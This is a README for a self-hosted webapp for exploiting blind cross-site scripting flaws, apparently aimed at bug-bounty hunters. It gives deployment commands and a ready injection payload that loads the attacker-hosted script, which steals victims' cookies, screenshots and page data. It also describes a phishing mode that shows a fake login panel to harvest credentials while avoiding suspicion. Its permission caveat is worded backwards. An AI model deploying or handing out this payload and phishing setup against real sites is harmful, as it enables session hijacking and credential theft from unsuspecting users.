# vaya-ciego-nen
**vaya-ciego-nen** is a tool that allows you to create your own webapp to detect, manage and exploit **Blind Cross-site scripting (XSS)** vulnerabilities.

A more detailed guide about this tool can be found [here](https://hipotermia.pw/guide/vaya-ciego-nen).


<p align="center">
  <img src="/static/img/dash.png">
  <img src="/static/img/info.png">
</p>

## How does it work?
This webapp serves a malicious JavaScript payload that will execute if a XSS is present, retrieving cookies, a screenshot and more info. This info can be seen in a dashboard where you're able to manage all the triggers, which are stored in a PostgreSQL database.

## Usage
The project is oriented to be deployed in a **free** [heroku](heroku.com) instance, but the changes are minimum if you want to use the code in your own server.

First, you'll need to install [`heroku-cli`](https://devcenter.heroku.com/articles/heroku-cli) if you don't have it already. Then:
```
$ git clone https://github.com/hipotermia/vaya-ciego-nen
$ cd vaya-ciego-nen
$ heroku login
$ heroku create name_of_your_app
$ heroku addons:create heroku-postgresql:hobby-dev
```
Modify the file `config.py` with a username/password of your choice (used to access your dashboard), change the domain for your *name_of_your_app.herokuapp.com*, and finally:
```
$ git add .
$ git commit -m "letsgo"
$ git push heroku master
```
That's it! Now you have your own dashboard in *name_of_your_app.herokuapp.com/dashboard* and you just have to use your favorite payload like `"><script src="https://name_of_your_app.herokuapp.com"></script>` to find blind XSS.

## Not sure of which input triggered your payload?
Create different payloads for each input using `name_of_your_app.herokuapp.com/?extra` modifying the *extra* param and this will be visible on your dashboard to recognize it. You can use `/?email_input` for an email input for example.

## HttpOnly on the session cookie?
No worries, use `name_of_your_app.herokuapp.com/phish` in your payload and instead of collecting info, a fake login panel will appear in the victim's browser and if he enters its credentials, they're going to be sent to your dashboard! A cookie will be set on the victim's browser to control the login panel just appears once to avoid suspicion.
> **Note:** Most bugbounties don't allow phishing attacks on their programs. Don't do this if you're 100% sure you're allowed.

<p align="center">
  <img src="/static/img/login.png">
</p>
